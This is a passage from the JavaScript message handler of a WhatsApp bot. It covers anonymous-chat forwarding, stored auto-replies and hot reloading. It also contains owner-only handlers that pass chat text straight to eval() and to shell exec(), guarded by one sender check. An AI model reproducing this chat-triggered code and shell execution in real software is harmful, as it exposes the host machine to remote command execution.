                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    hisoka.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
